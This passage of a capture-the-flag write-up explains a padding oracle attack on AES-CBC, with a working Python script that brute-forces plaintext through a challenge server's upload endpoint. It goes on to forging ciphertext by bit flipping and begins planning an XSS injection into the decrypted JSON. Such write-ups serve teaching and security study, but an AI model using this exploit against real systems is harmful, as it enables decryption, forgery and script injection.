ESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png" alt="image-20210729140911415"></p><p>One significant drawback of AES-CBC is that it does not solely provide intergrity protection. In other words, the attacker can modify the ciphertext (such as bit flipping) and send the modified ciphertext to the server without being noticed. This gives way to the padding oracle attack.</p><hr><p>Now, we can dive into the very details on <strong>how the padding oracle works</strong>.</p><p>Suppose the attack has possession of a ciphertext which can be divided into an <code>IV</code> and 3 ciphertext blocks <code>c1, c2, c3</code> . The purpose of the attacker is to decrypt the last ciphertext block <code>c3</code>. </p><p>The attacker changes the last byte of <code>c2</code> (XORed with some value), and then send it to the server. The server responses with either a â€œ<em>PADDING_ERROR</em>â€œ response or a 500 <em>status code</em> reponse. If we gets a 500 <em>status code</em> response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with <code>b"\x01</code>, one of the 16 valid padding format.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png" alt="image-20210729175108696"></p><p>After recovering the last byte, we can move on to decrypt all the previous bytes of the last plaintext block. For example, to decrypt the second last byte, we can utilize the  <code>b"\x02\x02"</code> padding format. Since we already have had knowledge of the last byte of plaintext, we can modify the last byte into any value we want by XOR something in  <code>c2</code>. At present, what we want is to make the last byte be <code>b"\x02"</code>, we XOR the last byte of <code>c2</code>  with the last byte of plaintext to cancel it into <code>b"\x00"</code>, then XOR in <code>b"\x02"</code>, resulting to <code>b"\x02"</code>. Then, try every 255 possible byte value <code>guess_byte XOR b"\x02"</code> (except <code>b"\x00"</code>) to XOR with the last second byte of <code>c2</code>, and send the modified ciphertext to the padding oracle until a 500 <em>status code</em> response, thus recovering the second last plaintext byte, which is exactly <code>guess_byte</code>.</p><p>The following is the Python code that can be used to, given ciphertext, recover the last plaintext block. </p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> aztec_code_generator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># padding_oracle recovers the last 16 plaintext bytes of the given ciphertext</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">padding_oracle</span><span class="hljs-params">(cipher)</span>:</span></span><br><span class="line">    plaintext = <span class="hljs-string">b""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>):</span><br><span class="line">        print(<span class="hljs-string">f"[*] index: <span class="hljs-subst">{index}</span>"</span>)</span><br><span class="line">        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            bytes_xor = <span class="hljs-string">b"\x00"</span>*(<span class="hljs-number">16</span>-index)+bytes([byte^index])+xor(plaintext,bytes([index]*(index<span class="hljs-number">-1</span>)))</span><br><span class="line">            new_cipher = cipher[:<span class="hljs-number">-32</span>] + xor(cipher[<span class="hljs-number">-32</span>:<span class="hljs-number">-16</span>], bytes_xor) + cipher[<span class="hljs-number">-16</span>:]</span><br><span class="line"></span><br><span class="line">            b64data = base64.b64encode(new_cipher)</span><br><span class="line">            code = aztec_code_generator.AztecCode(b64data)</span><br><span class="line">            code.save(<span class="hljs-string">f"./pics/<span class="hljs-subst">{byte}</span>.png"</span>, module_size=<span class="hljs-number">4</span>)</span><br><span class="line"></span><br><span class="line">            f = open(<span class="hljs-string">f"./pics/<span class="hljs-subst">{byte}</span>.png"</span>, <span class="hljs-string">"rb"</span>).read()</span><br><span class="line">            paramsMultipart = [(<span class="hljs-string">'file'</span>, (<span class="hljs-string">'1.png'</span>, f, <span class="hljs-string">'application/png'</span>))]</span><br><span class="line">            response = session.post(<span class="hljs-string">"http://207.154.224.121:8080/upload"</span>, files=paramsMultipart)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                body = response.content.split(<span class="hljs-string">b'&lt;div class="content__i"&gt;'</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b"div"</span>)[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">b"PADDING"</span> <span class="hljs-keyword">in</span> response.content:</span><br><span class="line">                    print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>, PADDING ERROR"</span>)</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>, <span class="hljs-subst">{body}</span>"</span>)</span><br><span class="line">            <span class="hljs-keyword">else</span>:<span class="hljs-comment"># response.status_code == 500</span></span><br><span class="line">                print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>"</span>)</span><br><span class="line">                plaintext = bytes([byte]) + plaintext</span><br><span class="line">                print(<span class="hljs-string">f"plaintext: <span class="hljs-subst">{plaintext}</span>"</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">return</span> plaintext</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Recovering-the-Entire-Plaintext"><a href="#Recovering-the-Entire-Plaintext" class="headerlink" title="Recovering the Entire Plaintext"></a>Recovering the Entire Plaintext</h2><p>By exploting the padding oracle, we are enabled to decrypt the last plaintext block byte by byte. Can we go any further? The answer is yes. </p><p>Once we have recovered the last plaintext block, we can drop the last ciphertext block, and continue to exploit the padding oracle to recover the second last plaintext block. Keep doing this, and we will recover all the plaintext blocks, namely the entire plaintext.</p><hr><p>In practice, we implemented the attack and succssfully recovered the entire plaintext, which was a json formatted data.</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">b'{"name": "12321", "surname": "123", "middle": "1", "time": "2021-07-26 13:37:00", "dest": "", "dep": "", "flight": "BLZH1337"}\x02\x02'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>At this point, we got to know how the server side might process the uploaded aztec code. After receiving the code, the server decoded it into ciphertext, decrypted the ciphertext, and unpadded the decryption result. If something wrong happened during unpadding, the server replied with a â€œ<em>PADDING_ERROR</em>â€œ response. After unpadding, the plaintext was then unmarshaled into an object (by something like <code>JSON.parse()</code>). If any error occurred, the server replied with a 500 <em>status code</em> response. The server would send back us a â€œSuccessâ€ response if everythingâ€™s ok. </p><h2 id="Arbitrary-Plaintext-Encryption"><a href="#Arbitrary-Plaintext-Encryption" class="headerlink" title="Arbitrary Plaintext Encryption"></a>Arbitrary Plaintext Encryption</h2><p>Recovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want.</p><p>To achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext. </p><p>Say the ciphertext <code>IV || c1 || c2 || c3</code> decrypts into <code>p1 || p2 || p3</code>, and we want to get the ciphertext of <code>p1' || p2' || p3</code>. </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png" alt="image-20210729181535279"></p><p>We first XOR <code>c1</code>  with <code>p2 XOR p2'</code> to get <code>c1'</code>. In this way, <code>IV || c1' || c2 || c3</code> will be decrypted into <code>junk || p2' || p3</code>.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png" alt="image-20210729181301243"></p><p>The nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by <code>JSON.parse()</code>. What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR <code>IV</code> with <code>junk XOR p1'</code> to get a new <code>IV'</code>. In this way, <code>IV' || c1' || c2 || c3</code> will be decrypted into <code>p1' || p2' || p3</code>, which is exactly we want!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png" alt="image-20210729182312222"></p><h2 id="The-XSS-Part"><a href="#The-XSS-Part" class="headerlink" title="The XSS Part"></a>The XSS Part</h2><p>So we could encrypt what we want now. What should we do next? According to the description of the challenge, we have to go and get the content of the central surveillance system to get the information of  Mr.Flag Flagger. But how?</p><p>Letâ€™s take a look at the json. There may be a bot in the backend use <code>JSON.parse()</code> to parse the json and some method to render a page with these json data. For example, <code>res.render("render.html", name=json.name, surname=json.surname)</code>. So we could try to inject a XSS vector into the plaintext, encrypt it and then send the payload to the bot through the upload API.</p><p>But, at first we need to understand the correspondence between API parameters and JSON parameters. After do a test, we generate a ciphertext through the <code>/finalize</code> API and decrypt the ciphertext to get the correspondence. </p><p></p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http:<span class="hljs-comment">//207.154.224.121:8080/finalize?lastName=1&amp;firstName=2&amp;origin=3&amp;Gender=4&amp;destination=5</span></span><br><span class="line"></span><br><span class="line">CipherText:</span><br><span class="line"><span class="hljs-number">8B</span>AHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3N</span><br><span class="line"></span><br><span class="line">PlainText:</span><br><span class="line">b<span class="hljs-number">'</span>{<span class="hljs-string">"name"</span>: <span class="hljs-string">"2"</span>, <span 